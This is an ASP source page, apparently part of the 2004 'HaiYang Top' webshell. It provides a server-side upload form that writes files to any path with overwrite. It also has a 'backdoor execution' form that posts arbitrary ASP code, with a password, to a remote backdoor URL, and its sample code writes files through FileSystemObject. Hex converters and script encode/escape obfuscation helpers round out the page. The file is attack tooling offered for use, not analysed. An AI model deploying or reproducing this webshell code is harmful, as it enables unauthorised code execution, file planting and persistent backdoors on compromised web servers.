<%
	option explicit
%>
<!--#include file="config.asp"-->

<!-- PageUpload Below -->
<%
	pageUpload()

	sub pageUpload()
		isIn(2)
		dim theAct,thePath,fileName
		theAct=request("theAct")
		thePath=request("thePath")
		fileName=request("fileName")
		
		showTitle("其它操作页面")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		if theAct="upload" then
			streamUpload thePath,fileName
			echo "<script language=""javascript"">location.href='?pageName=upload';</script>"
		end if
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" enctype="multipart/form-data" action="?pageName=upload&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> - Adodb.Stream File Upload</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td">
	  <input name="file" type="file" size="30">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="40">
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.value;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
    </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - 数制转换</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td"> 
      <input type=text name=text1 value=字符和数字转10和16进制 size=25 id=text9> 
      <input name="按钮" type=button onclick="main();" value="给我转"> <input type="text" name="vars" value=16进制转10进制和字符 size=25 id=vars2> 
      <input name="按钮2" type=button onClick="main2();" value="给我转"> </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By LCX 2004.11&nbsp;</td>
  </tr>
</table>
<script language=vbs>
	sub main()
		base=document.all.text9.value
		If IsNumeric(base) Then
			cc=hex(cstr(base))
			alert("10进制为"&base) 
			alert("16进制为"&cc)
			exit sub
		end if 
		aa=asc(cstr(base))
		bb=hex(aa)
		alert("10进制为"&aa) 
		alert("16进制为"&bb)
	end sub
	sub main2()
		If document.all.vars.value<>"" Then
			Dim nums,tmp,tmpstr,i
			nums=document.all.vars.value
			nums_len=Len(nums)
		For i=1 To nums_len
		    tmp=Mid(nums,i,1)
		    If IsNumeric(tmp) Then
    		    tmp=tmp * 16 * (16^(nums_len-i-1))
	    	Else
	        	If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
    	        	alert("你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。")
	        	    exit sub
		        End If
    		    tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))
		    End If
        	tmpstr=tmpstr+tmp
		Next
		alert("转换的10进制为:"&tmpstr&"其字符值为:"&chr(tmpstr))
		End If
	end sub
</script>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" target="_blank">
    <tr> 
      <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
        - 海阳顶端网ASP后门执行 </td>
    </tr>
    <tr> 
      <td class="trHead">&nbsp;</td>
    </tr>
    <tr> 
      <td height="18" align="center" class="td">&nbsp;表单提交地址: 
        <input name="theAction" type="text" id="theAction" value="http://" size="50">
        密码: 
        <input name="password" type="password" id="password" size="5"> 
        <input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.rows+=6;" value="+"> 
        <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.sharp.rows&gt;10){this.form.sharp.rows-=6;}" value="-"> 
      </td>
    </tr>
    <tr> 
      <td align="center" class="td"> <textarea name="<%=clientPassword%>" id="sharp" cols="80" rows="10">echo "www.haiyangtop.net"

fsoSaveToFile "物理路径\文件名",request("fileContent")

sub fsoSaveToFile(thePath,fileContent)
	dim fso,theFile
	set fso=server.createObject("scripting.fileSystemObject")
	set theFile=fso.openTextFile(thePath,2,true)
	theFile.write fileContent
	theFile.close
	echo "文件保存成功!"
	set fso=nothing
	set theFile=nothing
end sub

sub echo(str)
    response.write(str)
end sub</textarea>
        <textarea name="fileContent" cols="80" rows="10" id="fileContent">fileContent</textarea> </td>
    </tr>
    <tr> 
      <td align="center" class="td"> 
        <input type="submit" name="Submit3" value="提 交" onClick="this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"> 
        <input type="reset" name="Submit32" value="重 置">
        <input type="button" name="Submit4" value="提 示" onClick="alert('上面的文本框用来放要执行的代码\n下面的文本框用来传递其它数据\n下面的文本框的名字是fileContent');"> </td>
    </tr>
    <tr> 
      <td class="trHead">&nbsp;</td>
    </tr>
    <tr> 
      <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
    </tr>
  </form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
<form>
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - 网页代码常用加解密</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
      <td height="250" align="center" class="td"> 
        <textarea cols=80 name=Word onChange=SetWords(this) rows=6></textarea> 
      <br>
      <input name=encode onClick=SetNewWords1(this.form) type=button value="Escape加密"> 
      <INPUT name=uncode onclick=SetNewWords(this.form) type=button value="Escape解密"> 
      <input type="button" name="Submit2" value="Encode加密" onclick="this.form.NewWords.value=screncode(this.form.Word.value,'JS')"> 
      <input type="button" name="Submit2" value="Encode解密" onclick="this.form.NewWords.value=strdec(this.form.Word.value)">
      <br>
      <textarea cols=80 name=NewWords rows=6></textarea> 
    </td>
  </tr>
  </form>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</table>
<%
		showExecuteTime()
	end sub
%>
